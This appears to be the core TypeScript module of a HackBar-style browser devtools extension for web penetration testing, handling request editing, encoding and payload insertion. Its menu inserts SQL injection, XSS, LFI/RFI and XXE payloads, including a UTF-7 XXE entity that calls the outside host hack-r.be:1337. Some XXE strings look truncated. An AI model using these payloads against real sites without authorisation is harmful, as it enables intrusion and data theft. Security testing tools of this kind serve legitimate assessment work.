import { computed, nextTick, ref, type Ref } from "vue";
import browser from "webextension-polyfill";
import type { StoredHeaders } from "../types/messages";
import { Encrypt } from "../lib/encrypt";
import { staticPayloadById } from "../lib/payloads";
import { SQL } from "../lib/sql";
import { XSS } from "../lib/xss";

export type ActiveField = "url" | "post" | "referer" | "userAgent" | "cookie";

/** Format du corps pour les requêtes POST (Execute). */
export type PostBodyFormat = "urlencoded" | "json" | "raw";

function getDevtools(): typeof chrome.devtools {
  if (typeof chrome !== "undefined" && chrome.devtools) {
    return chrome.devtools;
  }
  const b = browser as unknown as { devtools?: typeof chrome.devtools };
  if (b.devtools) {
    return b.devtools;
  }
  throw new Error("devtools API unavailable");
}

export function useHackBar(getActiveTextarea: () => HTMLTextAreaElement | null) {
  const tabId = getDevtools().inspectedWindow.tabId;

  const urlField = ref("");
  const postDataField = ref("");
  const refererField = ref("");
  const userAgentField = ref("");
  const cookieField = ref("");

  const enablePost = ref(false);
  const enableReferer = ref(false);
  const enableUserAgent = ref(false);
  const enableCookie = ref(false);

  const customHeaderLines = ref<string[]>([""]);

  const postBodyFormat = ref<PostBodyFormat>("urlencoded");
  const postRawContentType = ref("text/plain");

  const postBodyHint = computed(() => {
    switch (postBodyFormat.value) {
      case "urlencoded":
        return "application/x-www-form-urlencoded";
      case "json":
        return "application/json";
      case "raw":
        return "Corps brut · type MIME ci-dessous";
      default:
        return "";
    }
  });

  const postBodyPlaceholder = computed(() => {
    switch (postBodyFormat.value) {
      case "urlencoded":
        return "name=value&other=…";
      case "json":
        return '{ "key": "value" }';
      case "raw":
        return "Corps brut (XML, texte, binaire encodé, …)";
      default:
        return "";
    }
  });

  const activeField = ref<ActiveField>("url");

  function setActiveField(f: ActiveField) {
    activeField.value = f;
  }

  function getFieldRef(f: ActiveField): Ref<string> {
    switch (f) {
      case "url":
        return urlField;
      case "post":
        return postDataField;
      case "referer":
        return refererField;
      case "userAgent":
        return userAgentField;
      case "cookie":
        return cookieField;
      default:
        return urlField;
    }
  }

  function jsonValid(text: string): false | unknown {
    try {
      return JSON.parse(text);
    } catch {
      return false;
    }
  }

  function buildFetchHeadersForPost(): Record<string, string> {
    const h: Record<string, string> = {};
    if (enableReferer.value) {
      h.Referer = refererField.value;
    }
    if (enableUserAgent.value) {
      h["User-Agent"] = userAgentField.value;
    }
    if (enableCookie.value) {
      h.Cookie = cookieField.value;
    }
    for (const line of customHeaderLines.value) {
      const t = line.trim();
      if (!t) {
        continue;
      }
      const m = t.match(/^([a-zA-Z\-]+):\s*(.*)$/);
      if (m) {
        h[m[1].trim()] = m[2].trim();
      }
    }
    const hasCt = Object.keys(h).some((k) => k.toLowerCase() === "content-type");
    if (!hasCt) {
      if (postBodyFormat.value === "json") {
        h["Content-Type"] = "application/json; charset=UTF-8";
      } else if (postBodyFormat.value === "raw") {
        const ct = postRawContentType.value.trim();
        h["Content-Type"] = ct || "application/octet-stream";
      }
    }
    return h;
  }

  function getFieldFormData(dataString: string): { name: string; value: string }[] {
    const fields: { name: string; value: string }[] = [];
    const parts = dataString.trim().split("&");
    for (const part of parts) {
      if (!part) {
        continue;
      }
      const m = part.match(/^(.*?)=(.*)$/s);
      if (m && m.length === 3) {
        try {
          fields.push({
            name: m[1],
            value: decodeURIComponent(m[2].replace(/\+/g, " ")),
          });
        } catch {
          fields.push({ name: m[1], value: m[2] });
        }
      }
    }
    return fields;
  }

  function urlEncode(inputStr: string): string {
    return encodeURIComponent(inputStr);
  }

  function jsonBeautify(inputStr: string): string | false {
    const j = jsonValid(inputStr);
    if (j) {
      return JSON.stringify(j, null, 4);
    }
    return false;
  }

  async function loadUrl(): Promise<void> {
    const message = (await browser.runtime.sendMessage({
      tabId,
      action: "load_url",
      data: null,
    })) as {
      url?: string;
      data?: string;
      headers?: {
        referer?: string;
        cookie?: string;
        custom: Record<string, string>;
      };
    };

    if (message.url) {
      urlField.value = message.url;
    }
    if (message.data && postDataField.value === "") {
      postDataField.value = message.data;
    }
    if (message.headers) {
      const h = message.headers;
      if (h.referer) {
        refererField.value = h.referer;
      }
      if (h.cookie) {
        cookieField.value = h.cookie;
      }
      if (h.custom && Object.keys(h.custom).length > 0) {
        const lines: string[] = [];
        for (const [k, v] of Object.entries(h.custom)) {
          lines.push(`${k}: ${v}`);
        }
        if (lines.length) {
          customHeaderLines.value = [...lines, ""];
        }
      }
    }
  }

  function splitUrl(): void {
    const field = getFieldRef(activeField.value);
    let uri = field.value;
    uri = uri.replace(/&/g, "\n&");
    uri = uri.replace(/\?/g, "\n?");
    field.value = uri;
  }

  function normalizeUrl(url: string): string {
    let u = url.replace(/[\n\r]/g, "").trim();
    if (!/^(https?:\/\/|view-source:)/i.test(u)) {
      u = "http://" + u;
    }
    return u;
  }

  /** Pour GET : URL utilisée par la navigation (sans view-source: pour `new URL`). */
  function urlForNavigation(url: string): string {
    return url.replace(/^view-source:/i, "");
  }

  async function execute(): Promise<void> {
    const Headers: StoredHeaders = {
      referer: null,
      user_agent: null,
      cookie: null,
      custom: null,
    };

    let post_data: { name: string; value: string }[] | null = null;
    let method: "GET" | "POST" = "GET";

    if (enableReferer.value) {
      Headers.referer = refererField.value;
    }
    if (enableUserAgent.value) {
      Headers.user_agent = userAgentField.value;
    }
    if (enableCookie.value) {
      Headers.cookie = cookieField.value;
    }
    if (enablePost.value) {
      method = "POST";
      if (postBodyFormat.value === "urlencoded") {
        post_data = getFieldFormData(postDataField.value);
      }
    }

    const enabledLines = customHeaderLines.value.filter((l) => l.trim() !== "");
    if (enabledLines.length > 0) {
      Headers.custom = {};
      for (const line of enabledLines) {
        const m = line.match(/^([a-zA-Z\-]+):\s*(.*)$/);
        if (m) {
          Headers.custom[m[1].trim()] = m[2].trim();
        }
      }
    }

    const url = normalizeUrl(urlField.value);
    if (!url) {
      return;
    }

    await browser.runtime.sendMessage({
      tabId,
      action: "send_requests",
      data: { headers: Headers, targetUrl: url },
    });

    const iw = getDevtools().inspectedWindow;

    if (method === "GET") {
      const clean = urlForNavigation(url);
      let uri: URL;
      try {
        uri = new URL(clean);
      } catch {
        return;
      }
      let code = `const url = "${encodeURIComponent(url)}";`;
      code += "window.location.href = decodeURIComponent(url);";
      if (uri.hash !== "") {
        code += "window.location.reload(true);";
      }
      await new Promise<void>((resolve) => {
        iw.eval(code, () => {
          setTimeout(resolve, 100);
        });
      });
    } else if (postBodyFormat.value === "urlencoded") {
      const code =
        'var post_data = "' +
        encodeURIComponent(JSON.stringify(post_data ?? [])) +
        '"; var url = "' +
        encodeURIComponent(url) +
        '";' +
        "var fields = JSON.parse(decodeURIComponent(post_data));" +
        'const form = document.createElement("form");' +
        'form.setAttribute("method", "post");' +
        'form.setAttribute("action", decodeURIComponent(url));' +
        "fields.forEach(function(f) { var input = document.createElement(\"input\"); input.setAttribute(\"type\", \"hidden\"); input.setAttribute(\"name\", f[\"name\"]); input.setAttribute(\"value\", f[\"value\"]); form.appendChild(input); });" +
        "document.body.appendChild(form);" +
        "form.submit();";
      await new Promise<void>((resolve) => {
        iw.eval(code, () => resolve());
      });
    } else {
      const target = urlForNavigation(url);
      const hdr = buildFetchHeadersForPost();
      const bodyText = postDataField.value;
      const hdrJson = JSON.stringify(hdr);
      const code =
        'var u = "' +
        encodeURIComponent(target) +
        '";' +
        'var body = decodeURIComponent("' +
        encodeURIComponent(bodyText) +
        '");' +
        'var hdr = JSON.parse(decodeURIComponent("' +
        encodeURIComponent(hdrJson) +
        '"));' +
        'fetch(decodeURIComponent(u), { method: "POST", headers: hdr, body: body, credentials: "include", redirect: "follow", mode: "cors" })' +
        '.then(function(r) { window.location.href = r.url; })' +
        '.catch(function(e) { console.error("HackBar POST:", e); });';
      await new Promise<void>((resolve) => {
        iw.eval(code, () => resolve());
      });
    }
  }

  function getSelectedOrPrompt(callback: (txt: string) => void): void {
    const ta = getActiveTextarea();
    if (ta) {
      const start = ta.selectionStart ?? 0;
      const end = ta.selectionEnd ?? 0;
      if (end - start >= 1) {
        const val = ta.value;
        callback(val.substring(start, end));
        return;
      }
    }
    const v = window.prompt("Please enter some text");
    if (v !== null && v !== "") {
      callback(v);
    }
  }

  function setSelectedText(str: string): void {
    const field = getFieldRef(activeField.value);
    const ta = getActiveTextarea();
    if (!ta) {
      field.value += str;
      return;
    }
    const start = ta.selectionStart ?? 0;
    const end = ta.selectionEnd ?? 0;
    const val = field.value;
    const pre = val.substring(0, start);
    const post = val.substring(end);
    field.value = pre + str + post;
    const pos = start + str.length;
    void nextTick(() => {
      ta.setSelectionRange(pos, pos);
      ta.focus();
    });
  }

  function onMenu(action: string, val?: string): void {
    switch (action) {
      case "md5":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.md5(txt)));
        break;
      case "sha1":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.sha1(txt)));
        break;
      case "sha256":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.sha2(txt)));
        break;
      case "sha384":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.sha384(txt)));
        break;
      case "sha512":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.sha512(txt)));
        break;
      case "rot13":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.rot13(txt)));
        break;
      case "base64_encode":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.base64Encode(txt)));
        break;
      case "base64_decode":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.base64Decode(txt)));
        break;
      case "url_encode":
        getSelectedOrPrompt((txt) => setSelectedText(urlEncode(txt)));
        break;
      case "url_decode":
        getSelectedOrPrompt((txt) => {
          try {
            setSelectedText(decodeURIComponent(txt.replace(/\+/g, " ")));
          } catch {
            setSelectedText(txt);
          }
        });
        break;
      case "hex_encode":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.strToHex(txt)));
        break;
      case "hex_decode":
        getSelectedOrPrompt((txt) => setSelectedText(Encrypt.hexToStr(txt)));
        break;
      case "jsonify":
        getSelectedOrPrompt((txt) => {
          const j = jsonBeautify(txt);
          if (j) {
            setSelectedText(j);
          }
        });
        break;
      case "uppercase":
        getSelectedOrPrompt((txt) => setSelectedText(txt.toUpperCase()));
        break;
      case "lowercase":
        getSelectedOrPrompt((txt) => setSelectedText(txt.toLowerCase()));
        break;
      case "sql_mysql_char":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToSQLChar("mysql", txt))
        );
        break;
      case "sql_basic_info_column":
        setSelectedText("CONCAT_WS(CHAR(32,58,32),user(),database(),version())");
        break;
      case "sql_convert_utf8":
        getSelectedOrPrompt((txt) =>
          setSelectedText("CONVERT(" + txt + " USING utf8)")
        );
        break;
      case "sql_convert_latin1":
        getSelectedOrPrompt((txt) =>
          setSelectedText("CONVERT(" + txt + " USING latin1)")
        );
        break;
      case "sql_mssql_char":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToSQLChar("mssql", txt))
        );
        break;
      case "sql_oracle_char":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToSQLChar("oracle", txt))
        );
        break;
      case "sql_postgres_char":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToSQLChar("postgres", txt))
        );
        break;
      case "sql_sqlite_char":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToSQLChar("sqlite", txt))
        );
        break;
      case "sql_union_statement":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToUnionSelect(txt))
        );
        break;
      case "sql_union_all_select":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToUnionAllSelect(txt))
        );
        break;
      case "sql_union_all_select_null":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToUnionAllSelectNULL(txt))
        );
        break;
      case "sql_spaces_to_inline_comments":
        getSelectedOrPrompt((txt) =>
          setSelectedText(SQL.selectionToInlineComments(txt))
        );
        break;
      case "xss_string_from_charcode":
        getSelectedOrPrompt((txt) =>
          setSelectedText(XSS.selectionToChar("stringFromCharCode", txt))
        );
        break;
      case "xss_html_characters":
        getSelectedOrPrompt((txt) =>
          setSelectedText(XSS.selectionToChar("htmlChar", txt))
        );
        break;
      case "xss_alert":
        setSelectedText(" alert(1) ");
        break;
      case "LFI":
      case "RFI":
        if (val) {
          setSelectedText(val);
        }
        break;
      case "xxe_lfi":
        setSelectedText(" ]]> &xxe; ");
        break;
      case "xxe_blind":
        setSelectedText(" ]]> &blind; ");
        break;
      case "xxe_load_resource":
        setSelectedText(" ]> &ac; ");
        break;
      case "xxe_ssrf":
        setSelectedText(" ]]> &xxe; ");
        break;
      case "xxe_rce":
        setSelectedText('[ run "uname" command] ]> &xxe; ');
        break;
      case "xxe_xee_local":
        setSelectedText(" ]> &lol9; ");
        break;
      case "xxe_xee_remove":
        setSelectedText(" ]> 3..2..1...&test ");
        break;
      case "xxe_utf7":
        setSelectedText(
          "+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4" +
            "+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+" +
            "+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4"
        );
        break;
      default:
        if (Object.prototype.hasOwnProperty.call(staticPayloadById, action)) {
          setSelectedText(staticPayloadById[action]);
        }
        break;
    }
  }

  function onKeydown(e: KeyboardEvent): void {
    if (e.ctrlKey && e.key === "Enter") {
      e.preventDefault();
      void execute();
    }
  }

  function addHeaderRow(): void {
    customHeaderLines.value = [...customHeaderLines.value, ""];
  }

  function removeHeaderRow(index: number): void {
    const lines = [...customHeaderLines.value];
    if (lines.length <= 1) {
      lines[0] = "";
      customHeaderLines.value = lines;
      return;
    }
    lines.splice(index, 1);
    customHeaderLines.value = lines;
  }

  function clearAll(): void {
    refererField.value = "";
    userAgentField.value = "";
    cookieField.value = "";
  }

  return {
    tabId,
    urlField,
    postDataField,
    refererField,
    userAgentField,
    cookieField,
    enablePost,
    postBodyFormat,
    postRawContentType,
    postBodyHint,
    postBodyPlaceholder,
    enableReferer,
    enableUserAgent,
    enableCookie,
    customHeaderLines,
    activeField,
    setActiveField,
    loadUrl,
    splitUrl,
    execute,
    onMenu,
    onKeydown,
    addHeaderRow,
    removeHeaderRow,
    clearAll,
  };
}
